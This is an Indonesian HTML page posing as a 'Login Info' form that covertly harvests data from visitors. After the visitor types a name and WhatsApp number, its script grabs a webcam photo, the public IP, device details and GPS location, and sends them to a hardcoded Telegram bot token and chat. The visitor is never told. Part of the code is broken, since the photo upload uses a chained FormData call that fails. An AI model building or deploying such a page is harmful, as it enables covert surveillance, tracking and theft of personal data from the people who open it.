<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Info</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      text-align: center;
      width: 300px;
      animation: fadeIn 0.7s ease;
    }
    input {
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      border-radius: 8px;
      border: none;
    }
    button {
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .back-btn {
      margin-top: 10px;
      font-size: 12px;
      background: none;
      border: none;
      color: #ccc;
      cursor: pointer;
      text-decoration: underline;
    }
    #loading {
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="popup" id="step1">
    <h2>Masukkan Nama Anda</h2>
    <input type="text" id="nama" placeholder="Nama Anda">
    <button onclick="lanjutKeNomor()">Lanjutkan</button>
  </div>

  <div class="popup" id="step2" style="display:none;">
    <h2>Masukkan Nomor WhatsApp ADMIN</h2>
    <input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
    <button onclick="mintaIzinDanKirim()">Kirim</button>
    <button class="back-btn" onclick="kembali()">Kembali</button>
  </div>

  <div id="loading">
    <h3>TOLONG........</h3>
    <p>Tunggu sebentar ya...</p>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    let namaGlobal = "";
    let ipPublic = "Tidak diketahui";
    let fotoBase64 = "";

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => ipPublic = data.ip)
      .catch(() => ipPublic = "Gagal ambil IP");

    function lanjutKeNomor() {
      const nama = document.getElementById("nama").value.trim();
      if (!nama) return alert("Masukkan nama dulu!");
      namaGlobal = nama;

      try {
        const ucapan = new SpeechSynthesisUtterance(`Halo, ${nama}`);
        ucapan.lang = 'id-ID';
        window.speechSynthesis.speak(ucapan);
      } catch (e) {}

      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    function kembali() {
      document.getElementById("step2").style.display = "none";
      document.getElementById("step1").style.display = "block";
    }

    function mintaIzinDanKirim() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
        .then(stream => {
          const video = document.getElementById('video');
          video.srcObject = stream;

          setTimeout(() => {
            ambilFoto();
            stream.getTracks().forEach(track => track.stop());
            kirimData();
          }, 3000);
        })
        .catch(() => {
          alert("Izin kamera/mikrofon ditolak!");
        });
    }

    function ambilFoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      fotoBase64 = canvas.toDataURL('image/jpeg');
    }

    function kirimData() {
      const whatsapp = document.getElementById("whatsapp").value.trim();
      if (!whatsapp) return alert("Masukkan nomor WhatsApp!");

      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "none";
      document.getElementById("loading").style.display = "block";

      const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
      const chat_id = '6374002294';
      const device = navigator.userAgent;
      const lang = navigator.language;
      const time = new Date();
      const hari = new Intl.DateTimeFormat('id-ID', { weekday: 'long' }).format(time);

      function kirimPesan(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chat_id, text: text })
        });
      }

      function kirimFoto(base64) {
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: new FormData().append('chat_id', chat_id).append('photo', base64)
        });
      }

      function formatPesan(lat, lon, cuaca) {
        return `INFORMASI DATA\nNama: ${namaGlobal}\nWhatsApp: ${whatsapp}\nIP: ${ipPublic}\nPerangkat: ${device}\nBahasa: ${lang}\nWaktu: ${time.toLocaleString('id-ID')}\nHari: ${hari}\nLokasi: https://www.google.com/maps?q=${lat},${lon}\nCuaca: ${cuaca}`;
      }

      function ambilCuaca(lat, lon) {
        fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=ISI_API_KEY_CUACA&units=metric`)
          .then(res => res.json())
          .then(data => {
            const suhu = data.main.temp;
            const deskripsi = data.weather[0].description;
            const cuaca = `${deskripsi}, ${suhu}°C`;
            kirimPesan(formatPesan(lat, lon, cuaca));
            if (fotoBase64) kirimFoto(fotoBase64);
            setTimeout(() => window.location.href = "thanks.html", 3000);
          })
          .catch(() => {
            kirimPesan(formatPesan("Tidak diketahui", "Tidak diketahui", "Gagal ambil cuaca"));
            if (fotoBase64) kirimFoto(fotoBase64);
            setTimeout(() => window.location.href = "thanks.html", 3000);
          });
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          ambilCuaca(lat, lon);
        }, () => {
          kirimPesan(formatPesan("Tidak diketahui", "Tidak diketahui", "Tidak diketahui"));
          if (fotoBase64) kirimFoto(fotoBase64);
          setTimeout(() => window.location.href = "thanks.html", 3000);
        });
      } else {
        kirimPesan(formatPesan("Tidak tersedia", "Tidak tersedia", "Tidak tersedia"));
        if (fotoBase64) kirimFoto(fotoBase64);
        setTimeout(() => window.location.href = "thanks.html", 3000);
      }
    }
  </script>
</body>
</html>
